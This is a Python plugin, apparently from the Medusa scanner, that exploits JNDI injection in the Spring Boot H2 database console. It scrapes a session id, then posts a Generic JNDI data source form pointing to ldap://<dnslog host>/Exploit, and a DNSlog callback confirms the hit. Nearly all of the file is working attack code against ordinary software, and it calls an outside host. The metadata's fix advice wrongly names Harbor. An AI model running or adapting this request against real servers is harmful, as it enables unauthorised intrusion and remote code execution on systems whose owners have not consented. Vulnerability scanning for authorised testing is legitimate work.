#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
import re
import urllib3
import requests
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-5-9"  # 插件编辑时间
        self.info['disclosure'] = '2020-5-7'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "SpringBootH2DatabaseJNDIInjection"  # 插件名称
        self.info['name'] ='SpringBootH2数据库JNDI注入' #漏洞名称
        self.info['affects'] = "Spring"  # 漏洞组件
        self.info['desc_content'] = "在SpringBoot中使用H2数据库，pom.xml引入依赖"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Harbor版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:

        payload ="/h2-console/login.do?jsessionid="
        payload_url = scheme + "://" + url + ":" + str(port) + payload+"ad3ae393781ccf8d7abf0345aa88e398"
        jsession = requests.get(payload_url, timeout=5,proxies=proxies, verify=False, headers=Headers, )
        global pgroups
        preg = re.compile(r"login\.jsp\?jsessionid=(.*?)'", re.S)
        pgroups = re.findall(preg, jsession.text)
        if not pgroups:
            preg = re.compile(r"admin\.do\?jsessionid=(.*?)\"", re.S)
            pgroups = re.findall(preg, jsession.text)

        payload_url2 = scheme + "://" + url + ":" + str(port) + payload +pgroups[0]

        Headers2=Headers
        Headers2['Content-Type']='application/x-www-form-urlencoded'
        Headers2['Referer']=payload_url2

        DL=Dnslog()
        data= "language=en&setting=Generic+JNDI+Data+Source&name=Generic+JNDI+Data+Source&driver=javax.naming.InitialContext&url=ldap%3A%2F%2F{}%2FExploit&user=&password=".format(DL.dns_host())
        resp = requests.post(payload_url2,data=data,headers=Headers2, proxies=proxies, timeout=6, verify=False)
        time.sleep(4)
        if DL.result():
            Medusa = "{}存在SpringBootH2数据库JNDI注入漏洞\r\n验证数据:\r\n返回内容:{}\r\nDnsLog:{}\r\nDnsLog数据:{}\r\n".format(url,resp.text,DL.dns_host(),str(DL.dns_text()))
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类
